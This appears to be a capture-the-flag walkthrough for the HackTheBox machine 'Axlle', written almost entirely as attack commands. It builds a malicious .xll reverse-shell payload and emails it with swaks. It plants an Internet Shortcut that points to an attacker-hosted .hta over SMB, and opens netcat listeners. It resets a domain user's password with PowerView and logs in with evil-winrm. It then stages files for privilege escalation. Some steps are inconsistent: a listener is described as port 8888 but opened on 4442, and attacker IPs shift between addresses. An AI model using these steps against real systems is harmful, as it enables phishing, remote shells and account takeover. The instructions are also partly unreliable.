### Nmap scan 
```shell
$ nmap -A -oA nmap/tcp 10.10.11.21 -T4
```
Add axlle.htb to the **/etc/hosts** file.

### Getting a foothold

#### Compile the C code called **revershell.c** containing an exploit and a reverse shell on attacker machine

#### Create the .xll file
```shell
x86_64-w64-mingw32-gcc -shared -fPIC -o trustthis.xll reverseshell.c
```

#### Create a reverse shell on the attack box using netcat
```shell
$ nc -nvlp 4444
```

#### Send the malicious trustthis.xll file to the target using this email command
```shell
swaks --from sheltCP1@axlle.htb --to accounts@axlle.htb --body "Hello" --header "Subject: Hello" --attach @trustthis.xll
```
#### Create Internet Shortcut with the filename shortcut.url
```url
URL=file://10.10.14.100/share/exploit.hta
```
#### Create a .hta file on attacker machine, the file is named exploit.hta in the folder of this file

#### Open a listener on port 8888 as described in the exploit.hta file
```shell
$ nc -nvlp 4442
```
#### On the Target Machine 
```shell
$ cd /inetpub/testing
```
#### Run the following command on the target machine
```shell
$ wget http://10.10.14.102:8000/shortcut.url -o shortcut.url
```
#### Open an impacket-smbserver on the folder where the .hta is located
```shell
$ impacket-smbserver -smb2support share .
```
### Priviledge Escalation

#### Download and save this script to your attack box
```url
https://github.com/PowerShellMafia/PowerSploit/blob/master/Recon/PowerView.ps1
```
#### Load the Contents of the Above file to the Target Box
```shell
$ wget http://10.10.14.102:8000/PowerView.ps1 -o PowerView.ps1
```
#### Import the PowerView.ps1 module
```shell
$ import-module .\PowerView.ps1
```
#### Seeting up Credentials for Jacob Greeny
```shell
$ $Password = ConvertTo-SecureString ‘verySecurePassword121!’ -AsPlainText -Force
```
```shell
$ Set-DomainUserPassword -Identity Jacob.Greeny -AccountPassword $Password
```
#### Logging in as Jacob Greeny
```shell
$ evil-winrm -i 10.10.11.21 -u Jacob.Greeny -p verySecurePassword121!
```
#### Create a directory with the Name **Work**
```shell
$ mkdir work
```
```shell
$ cd work
```
#### Create Another Directory Inside the Work Directory and Name it "myTestDir"
```shell
$ mkdir myTestDir
```
#### Create a file in the work directory and name it reboot.rsf
**Type the below content in the reboot.rsf file**
```text
myTestDir
True
```
**You can achieve that by typing this below on the shell**
```shell
echo myTestDir True > reboot.rsf
```

#### Create Another File in the myTestDir and name it "working"
```shell
$ mkdir working # This should be done inside myTestDir
```
```shell
$ cd working
```

### Create an Empty File in the Working Directory and Name it rsf.rsf
```shell
$ echo > rsf.rsf
```
**Remeber**
```shell
$ cd \work\myTestDir\working\
```
### Create a Command.txt File in your Attacking Machine and Share it with the Work Directory on the target machine.
Go to the **command.txt** file in this folder

#### start python http server
#### On the Target Machine run in "work/myTestDir/working" directory
```shell
$ wget http://10.10.14.100:8000/command.txt -o command.txt
```
#### Open a Listener on your attacking machine port you specified in the command.txt file
```shell
$ nc -nvlp 4443
```

### Copy the Content of the Work Directory to C the Local Program File.
```shel
$ cp -r .\work* "C:\Program Files (x86)\Windows Kits\10\Testing\StandaloneTesting\Internal\x64\"
$ cp -r .\work* C:\"Program Files (x86)"\"Windows Kits"\10\Testing\StandaloneTesting\Internal\x64\
```
